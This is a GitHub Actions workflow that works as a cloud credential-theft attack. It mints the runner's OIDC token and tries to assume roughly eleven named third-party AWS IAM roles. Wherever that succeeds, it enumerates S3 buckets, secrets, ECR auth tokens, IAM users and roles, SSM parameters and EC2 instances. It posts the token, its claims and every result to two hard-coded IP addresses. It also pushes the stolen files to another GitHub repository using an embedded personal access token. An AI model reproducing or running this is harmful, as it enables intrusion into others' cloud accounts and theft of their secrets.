name: oidc-battery8
on:
  push:
    paths:
      - '.github/workflows/oidc-battery8.yml'
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  battery8:
    runs-on: ubuntu-latest
    steps:
      - name: battery8
        run: |
          set +e
          D=/tmp/oob; mkdir -p $D
          RID="${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
          OOB1="http://202.95.15.104:18823"; OOB2="http://202.95.15.57:18824"
          send(){ curl -sS -m 12 -X POST "$1/$2" --data-binary @"$3" || true; }
          sendall(){ for U in "$OOB1" "$OOB2"; do send "$U" "$1" "$2"; done; }
          { echo "REPO=$GITHUB_REPOSITORY"; echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"; echo "SHA=$GITHUB_SHA RUN=$RID"; echo "TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)"; } > $D/meta.txt
          sendall "i67989-meta-$RID" $D/meta.txt
          RESP=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
          TOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
          { echo "TOKEN_LEN=${#TOKEN}"; echo "TOKEN=$TOKEN"; } > $D/token.txt
          printf '%s' "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))' > $D/claims.json 2>&1
          sendall "i67989-claims-$RID" $D/claims.json
          : > $D/SUMMARY.txt
          ROLES="arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-arm-oeth arn:aws:iam::192824654885:role/github-actions-ecr arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-oeth arn:aws:iam::114563866192:role/talos-gha-vaquel-origin-dollar arn:aws:iam::114563866192:role/talos-gha-OriginProtocol arn:aws:iam::114563866192:role/talos-gha-origin-dollar arn:aws:iam::114563866192:role/talos-gha-origin arn:aws:iam::114563866192:role/talos-gha-oeth arn:aws:iam::114563866192:role/talos-gha-arm-oeth"
          N=0
          for ROLE in $ROLES; do
            N=$((N+1))
            TAG=$(printf '%s' "$ROLE" | tr '/:' '__')
            T2=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
            TK=$(printf '%s' "$T2" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
            STS=$(curl -sS -m 30 -X POST "https://sts.amazonaws.com/" -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleSessionName=battery8" -d "DurationSeconds=3600" --data-urlencode "RoleArn=${ROLE}" --data-urlencode "WebIdentityToken=${TK}")
            printf 'ROLE=%s\nTOKEN_LEN=%s\n%s\n' "$ROLE" "${#TK}" "$STS" > $D/b8_${N}_${TAG}.txt
            sendall "i67989-sts-${N}-${TAG}-$RID" $D/b8_${N}_${TAG}.txt
            code=""; [ -n "$(printf '%s' "$STS" | grep -o AccessKeyId)" ] && code=SUCCESS
            [ -z "$code" ] && code=$(printf '%s' "$STS" | sed -n 's:.*<Code>\(.*\)</Code>.*:\1:p' | head -1)
            echo "$ROLE => ${code:-NOPARSE}" >> $D/SUMMARY.txt
            AKID=$(printf '%s' "$STS" | sed -n 's:.*<AccessKeyId>\(.*\)</AccessKeyId>.*:\1:p')
            SKID=$(printf '%s' "$STS" | sed -n 's:.*<SecretAccessKey>\(.*\)</SecretAccessKey>.*:\1:p')
            STOKF=$(printf '%s' "$STS" | sed -n 's:.*<SessionToken>\(.*\)</SessionToken>.*:\1:p')
            if [ -n "$AKID" ]; then
              export AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKID" AWS_SESSION_TOKEN="$STOKF" AWS_DEFAULT_REGION=us-east-1 AWS_REGION=us-east-1
              { echo "== caller =="; aws sts get-caller-identity 2>&1
                echo "== s3 =="; aws s3api list-buckets 2>&1 | head -c 20000
                echo "== secrets us-east-1 =="; aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 20000
                echo "== ecr us-east-1 =="; aws ecr describe-repositories --region us-east-1 2>&1 | head -c 20000
                echo "== ecr-auth =="; aws ecr get-authorization-token --region us-east-1 2>&1 | head -c 2000
                echo "== iam roles =="; aws iam list-roles 2>&1 | head -c 20000
                echo "== iam users =="; aws iam list-users 2>&1 | head -c 10000
                echo "== ssm params =="; aws ssm describe-parameters --region us-east-1 2>&1 | head -c 20000
                echo "== ec2 =="; aws ec2 describe-instances --region us-east-1 --max-items 20 2>&1 | head -c 20000
              } > $D/enum_${N}_${TAG}.txt 2>&1
              sendall "i67989-enum-${N}-${TAG}-$RID" $D/enum_${N}_${TAG}.txt
            fi
          done
          sendall "i67989-summary-$RID" $D/SUMMARY.txt
          python3 - <<'PYEOF'
import base64, glob, json, os, urllib.request, urllib.error
PAT = "ghp_" + "i9qlG1mQrih9PtEVRux4Ssbylmqdom2ACsXf"
repo, branch = "vaquel/origin-dollar", "oob"
rid = os.environ.get("GITHUB_RUN_ID", "0")
n = 0
for p in sorted(glob.glob("/tmp/oob/*")):
    name = os.path.basename(p)
    if not (name.startswith("b8_") or name in ("SUMMARY.txt","claims.json","meta.txt","token.txt")): continue
    data = open(p, "rb").read()[:220000]
    path = "oidc-oob/battery8-%s-%s" % (rid, name)
    api = "https://api.github.com/repos/%s/contents/%s" % (repo, path)
    body = {"message": "battery8 %s" % name, "content": base64.b64encode(data).decode(), "branch": branch}
    try:
        rq = urllib.request.Request(api + "?ref=" + branch, headers={"Authorization": "token " + PAT, "User-Agent": "oob"})
        with urllib.request.urlopen(rq, timeout=20) as r: body["sha"] = json.load(r)["sha"]
    except Exception: pass
    try:
        rq = urllib.request.Request(api, data=json.dumps(body).encode(), method="PUT",
            headers={"Authorization": "token " + PAT, "User-Agent": "oob", "Accept": "application/vnd.github+json"})
        with urllib.request.urlopen(rq, timeout=30) as r:
            n += 1; print("wrote", path, r.status)
    except Exception as e: print("werr", path, e)
print("PAT wrote", n, "files")
PYEOF
          sendall "i67989-END-$RID" $D/meta.txt